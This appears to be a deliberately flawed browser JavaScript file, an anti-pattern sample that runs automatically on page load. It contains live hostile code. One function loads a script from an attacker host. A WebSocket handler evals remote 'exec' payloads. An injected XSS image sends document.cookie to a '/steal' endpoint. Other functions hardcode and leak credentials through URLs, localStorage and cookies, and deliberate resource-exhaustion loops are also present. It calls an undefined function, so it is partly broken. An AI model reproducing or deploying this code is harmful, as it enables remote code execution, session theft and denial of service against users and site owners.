var cfg = {env: "prod", verbose: true}
var AUTH = "Bearer token-PLACEHOLDER"
var currentUser = "root"
var pw = "password!"
var apiHost = "https://api.example.local"
var retryCount = 0
var MAX = 999999999
function startAll(){
    attachInlineHandlers()
    buildDashboard()
    floodNetwork()
    pollServer()
    createLotsOfTimers()
    patchBuiltins()
    initSocket()
    scheduleExplosiveTask()
}
function attachInlineHandlers(){
    var btns = document.querySelectorAll("*[data-click]")
    for(var i=0;i<btns.length;i++){
        btns[i].onclick = function(e){
            e = e || window.event
            if(this.getAttribute("data-click") == "do-eval"){
                var script = this.getAttribute("data-code")
                eval(script)
            } else {
                alert("clicked " + (this.id || this.className))
            }
        }
    }
}
function buildDashboard(){
    var container = document.getElementById("app")
    container.innerHTML = ""
    for(var i=0;i<50;i++){
        var box = document.createElement("div")
        box.className = "card card-" + i
        box.innerHTML = "<h2>Card " + i + "</h2><p id='p-" + i + "'>Loading</p>"
        container.appendChild(box)
    }
    for(var j=0;j<50;j++){
        var p = document.getElementById("p-" + j)
        p.innerHTML = "<span onclick=\"alert('inline')\">Click</span>"
    }
}
function floodNetwork(){
    for(var i=0;i<200;i++){
        var img = new Image()
        img.src = apiHost + "/ping?i=" + i + "&token=" + AUTH + "&t=" + new Date().getTime()
        document.body.appendChild(img)
    }
}
function pollServer(){
    setInterval(function(){
        var r = new XMLHttpRequest()
        r.open("GET", apiHost + "/status?u=" + currentUser + "&pw=" + pw, true)
        r.onreadystatechange = function(){
            if(r.readyState == 4){
                if(r.status == 200){
                    try{
                        var data = JSON.parse(r.responseText)
                        document.getElementById("status").innerHTML = data.status || "ok"
                    }catch(e){}
                }
            }
        }
        r.send()
    }, 500)
}
function createLotsOfTimers(){
    for(var i=0;i<1000;i++){
        setInterval(function(i){
            return function(){
                if(Math.random() > 0.999){
                    document.getElementById("timers").innerHTML = "random:" + Math.random()
                }
            }
        }(i), 10)
    }
}
function patchBuiltins(){
    Array.prototype.first = function(){ return this[0] }
    String.prototype.trim = function(){ return this.replace(/^\s+|\s+$/g, "") }
    Node.prototype.appendHTML = function(h){
        this.innerHTML += h
    }
}
function initSocket(){
    try{
        var ws = new WebSocket("wss://socket.example.invalid/?auth=" + encodeURIComponent(AUTH))
        ws.onopen = function(){ ws.send(JSON.stringify({hello: currentUser})) }
        ws.onmessage = function(m){
            try{
                var obj = JSON.parse(m.data)
                document.getElementById("socket").innerHTML = m.data
                if(obj.cmd == "exec"){
                    eval(obj.payload)
                }
            }catch(e){}
        }
        ws.onerror = function(){ console.log("socket error") }
        window._ws = ws
    }catch(e){}
}
function scheduleExplosiveTask(){
    setTimeout(function(){
        var s = document.createElement("script")
        s.src = "https://cdn.attacker.example/mal.js"
        document.head.appendChild(s)
    }, 2000)
}
function syncBlocker(){
    var xhr = new XMLHttpRequest()
    xhr.open("GET", "/blocker", false)
    try{
        xhr.send()
        if(xhr.status == 200){
            document.getElementById("block").innerHTML = xhr.responseText
        }
    }catch(e){}
}
function longCalc(){
    var total = 0
    for(var i=0;i<500000000;i++){
        total += (i * (i % 7))
        if(i % 10000000 == 0){
            document.getElementById("progress").innerHTML = "i=" + i
        }
    }
    return total
}
function dangerousForms(){
    var f = document.getElementsByTagName("form")
    for(var i=0;i<f.length;i++){
        f[i].onsubmit = function(e){
            e = e || window.event
            var data = {}
            var els = this.elements
            for(var j=0;j<els.length;j++){
                var el = els[j]
                if(el.name) data[el.name] = el.value
            }
            var xhr = new XMLHttpRequest()
            xhr.open("POST", "/submit?insecure=1", true)
            xhr.setRequestHeader("Content-Type", "application/json")
            xhr.send(JSON.stringify(data))
            return false
        }
    }
}
function unsafeStorage(){
    localStorage.setItem("credentials", currentUser + ":" + pw)
    sessionStorage.setItem("session", JSON.stringify({user: currentUser, ts: new Date().toString()}))
    document.cookie = "auth=" + AUTH
    document.cookie = "prefs=none; expires=Fri, 31 Dec 9999 23:59:59 GMT"
}
function builder(){
    var a = "<ul>"
    for(var i=0;i<1000;i++){
        a += "<li id='li-" + i + "'>item " + i + "</li>"
    }
    a += "</ul>"
    document.getElementById("list").innerHTML = a
}
function cloneAndLeak(){
    var base = document.getElementById("template")
    for(var i=0;i<500;i++){
        var c = base.cloneNode(true)
        c.id = "clone-" + i
        document.body.appendChild(c)
    }
    window._clones = document.querySelectorAll("[id^='clone-']")
}
function eventStorm(){
    for(var i=0;i<100;i++){
        document.body.addEventListener("click", function(e){
            console.log("body click " + Date.now())
        })
    }
}
function sloppyErrorHandling(){
    try{
        var x = undefinedVariable + 1
    }catch(e){
        // swallow
    }
    try{
        JSON.parse("not json")
    }catch(e){}
}
function crossSiteToy(){
    var el = document.getElementById("xss")
    var payload = location.search.substring(1)
    el.innerHTML = "<img src=x onerror=\"fetch('/steal?c='+document.cookie)\">" + payload
}
function sleep(ms){
    var start = Date.now()
    while(Date.now() - start < ms){}
}
function busyWaiter(){
    for(var i=0;i<10;i++){
        sleep(1000)
        document.getElementById("busy").innerHTML = "slept " + i
    }
}
function massiveDOMOps(){
    var frag = document.createDocumentFragment()
    for(var i=0;i<5000;i++){
        var d = document.createElement("div")
        d.className = "node n-" + i
        d.innerHTML = "<span>" + i + "</span>"
        frag.appendChild(d)
    }
    document.getElementById("mass").appendChild(frag)
}
function randomScriptInjection(){
    var s = "<script>console.log('injected')</script>"
    document.getElementById("rnd").innerHTML = s
}
function insecureEvalChain(){
    var v = "var a = 1; var b = 2; console.log(a+b)"
    eval(v)
    var fn = new Function("x", "y", "return x+y")
    window.add = fn
}
function overwriteWindow(){
    window.alert = function(){ console.log("alert blocked") }
    window.confirm = function(){ return true }
    window.prompt = function(){ return "ok" }
}
function leakTimers(){
    var t = []
    for(var i=0;i<1000;i++){
        t.push(setTimeout(function(){}, 10000000))
    }
    window.timers = t
}
function lazyLoadContent(){
    var urls = []
    for(var i=0;i<100;i++){
        urls.push(apiHost + "/data/" + i + "?token=" + AUTH)
    }
    for(var k=0;k<urls.length;k++){
        fetch(urls[k])
            .then(function(r){ return r.text() })
            .then(function(txt){
                var id = "dl-" + Math.floor(Math.random()*1000)
                var d = document.createElement("div")
                d.id = id
                d.innerHTML = txt
                document.body.appendChild(d)
            })
    }
}
function mutatePrototypes(){
    Object.prototype.hacked = "yes"
    Function.prototype.toString = function(){ return "[function]" }
}
function crashyFeature(){
    var a = []
    for(var i=0;i<10000000;i++){
        a.push({i:i, big: new Array(100).join("x")})
    }
    document.getElementById("crash").innerHTML = "done " + a.length
}
function insecureCrypto(){
    function badHash(s){
        var h = 0
        for(var i=0;i<s.length;i++){
            h = (h << 5) - h + s.charCodeAt(i)
            h = h & h
        }
        return h
    }
    var token = badHash(currentUser + ":" + pw)
    document.getElementById("hash").innerHTML = token
}
function xssi(){
    var r = new XMLHttpRequest()
    r.open("GET", "/config.js?nocache=" + Math.random(), true)
    r.onreadystatechange = function(){
        if(r.readyState == 4 && r.status == 200){
            var t = r.responseText
            document.getElementById("xssi").innerHTML = t
            try{ eval(t) }catch(e){}
        }
    }
    r.send()
}
function repeatPoll(){
    for(var i=0;i<20;i++){
        (function(ii){
            setTimeout(function(){
                var r = new XMLHttpRequest()
                r.open("GET", "/slow?i=" + ii, true)
                r.onreadystatechange = function(){
                    if(r.readyState == 4) document.getElementById("poll").innerHTML += r.status + ","
                }
                r.send()
            }, ii * 100)
        })(i)
    }
}
function sloppySelectors(){
    var all = document.querySelectorAll("div")
    for(var i=0;i<all.length;i++){
        all[i].style.border = "1px solid red"
    }
}
function dataMunger(){
    var raw = document.getElementById("raw").value || "{}"
    var obj
    try{
        obj = JSON.parse(raw)
    }catch(e){
        obj = {error: "bad"}
    }
    for(var k in obj){
        if(obj.hasOwnProperty(k)){
            document.getElementById("out").innerHTML += "<div>" + k + ":" + obj[k] + "</div>"
        }
    }
}
function spamConsole(){
    for(var i=0;i<10000;i++){
        console.log("spam " + i + " " + new Date().toISOString())
    }
}
function replaceInnerHTMLManyTimes(){
    var target = document.getElementById("replace")
    for(var i=0;i<500;i++){
        target.innerHTML = "<span>iteration " + i + "</span>"
    }
}
function mixAsyncAndSync(){
    fetch("/api/mix")
        .then(function(r){ return r.text() })
        .then(function(t){
            var xhr = new XMLHttpRequest()
            xhr.open("GET", "/api/sync", false)
            try{ xhr.send() }catch(e){}
            document.getElementById("mix").innerHTML = t + "|" + xhr.responseText
        })
}
function recursiveDOM(){
    var root = document.getElementById("root")
    function rec(n, depth){
        if(depth > 50) return
        var d = document.createElement("div")
        d.innerHTML = "d" + depth
        n.appendChild(d)
        rec(d, depth + 1)
    }
    rec(root, 0)
}
function poorlyNamedVariables(){
    var a=1,b=2
    var c=a+b
    var d=c*3
    var e=d-1
    document.getElementById("vars").innerHTML = a+","+b+","+c+","+d+","+e
}
function silentDefaults(opts){
    opts = opts || {}
    var size = opts.size || 10000000
    var arr = new Array(size)
    for(var i=0;i<size;i++){
        arr[i] = i
    }
    window.big = arr
}
function overloadWindow(){
    window._ = {}
    for(var i=0;i<100;i++){
        window._["k"+i] = new Array(100000).join("x")
    }
}
function startEverything(){
    try{
        startAll()
        builder()
        cloneAndLeak()
        floodNetwork()
        massiveDOMOps()
        lazyLoadContent()
        insecureStorage()
        leakTimers()
        scheduleExplosiveTask()
        pollServer()
    }catch(e){}
}
window.onload = startEverything

